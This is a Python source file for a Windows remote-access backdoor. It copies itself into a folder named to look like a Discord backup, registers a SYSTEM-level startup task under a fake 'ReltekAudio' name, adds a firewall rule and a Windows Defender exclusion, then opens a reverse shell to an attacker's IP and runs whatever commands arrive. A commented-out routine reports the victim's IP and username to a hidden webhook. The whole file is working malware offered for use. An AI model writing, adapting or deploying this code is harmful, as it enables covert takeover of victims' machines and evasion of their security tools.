import socket
import requests
import subprocess
import base64
import sys
import shutil
import os
import getpass
import time
# sets the filepath as either the original py file or if pyinstaller is used it grabs the exe location instead of the temp file
filepath = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
# config
ip = "iphere"
port = 8888
# startup automatically with highest privelages (bypasses UAC... i think not sure but im 90% positive it does)
def start(progpath):
    cmd = [
        "schtasks",
        "/Create",
        "/TN", "ReltekAudio",
        "/TR", f'"{progpath}"',
        "/SC", "ONSTART",
        "/RU", "SYSTEM",
        "/RL", "HIGHEST",
        "/F"
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
    except:
        pass
# copies the file to %appdata%\local\discordbak essentially making it look like discords backup folder
def copy(destin):
    expanded = os.path.expandvars(destin)
    os.makedirs(expanded, exist_ok=True)
    dest_path = os.path.join(expanded, os.path.basename(filepath))
    if os.path.abspath(filepath) != os.path.abspath(dest_path):
        shutil.copy(filepath, dest_path)
    return dest_path
# auto allows your PC to connect to the host without any firewall issues
def firewall(rulename, progpath, target_ip):
    cmd = [
        "netsh", "advfirewall", "firewall", "add", "rule",
        f"name={rulename}",
        "dir=out",
        "action=allow",
        f"program={progpath}",
        f"remoteip={target_ip}",
        "enable=yes"
    ]
    try:
        subprocess.run(cmd, capture_output=True, text=True, check=True)
    except:
        pass
def exclude(dest):
    cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{dest}\'"'
    subprocess.run(cmd, shell=True)
# sends a message to your webhook (encode it in b64 using https://base64encode.org) very useful trust me
# optional, uncomment it out if you wanna do it by getting rid of the "#" infront of the code
# def webmsg():
  #  url = "EncodedURLhere"
   # decoded = base64.b64decode(url.encode('utf-8'))
   # weburl = decoded.decode('utf-8')
   # try:
    #    response = requests.get('https://api.ipify.org', timeout=5)
     #   ipaddr = response.text
   # except:
    #    ipaddr = "unknown"
  #  try:
   #     username = getpass.getuser()
 #   except:
    #    username = os.environ.get('USER') or os.environ.get('USERNAME') or "unknown"
  #  payload = {
   #     "content": f"@everyone {ipaddr}:{username} has connected to {ip}."
#    }
 #   try:
 #       requests.post(weburl, json=payload, timeout=5)
 #   except:
    #    pass

# connection
def connect():
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((ip, port))
            webmsg()
        except:
            client_socket.close()
            time.sleep(3)
            continue
        while True:
            try:
                command = client_socket.recv(4096).decode('utf-8')
                if not command:
                    break
                command_str = command.strip()
                if command_str.lower() == 'exit':
                    client_socket.close()
                    return
                if command_str == 'cd':
                    output = os.getcwd() + '\n'
                elif command_str.startswith('cd '):
                    try:
                        target_dir = command_str[3:].strip()
                        os.chdir(target_dir)
                        output = f"changed directory to {os.getcwd()}\n"
                    except Exception as e:
                        output = f"cd error: {str(e)}\n"
                else:
                    try:
                        proc = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = proc.communicate(timeout=10)
                        output = stdout + stderr
                        if isinstance(output, bytes):
                            output = output.decode('utf-8', errors='ignore')
                    except Exception as e:
                        output = str(e)        
                if not output.endswith('\n'):
                    output += '\n' 
                output_bytes = output.encode('utf-8')
                header = f"{len(output_bytes)}\n".encode('utf-8')
                client_socket.sendall(header + output_bytes)
            except:
                break
        client_socket.close()
        time.sleep(3)
# main
if __name__ == "__main__":
    # customize the location of destin if wanted btw
    destin = r"%userprofile%\appdata\local\discordbak"
    installed_path = copy(destin)
    firewall("UpdateRule", installed_path, ip)
    exclude(installed_path)
    start(installed_path)
    connect()
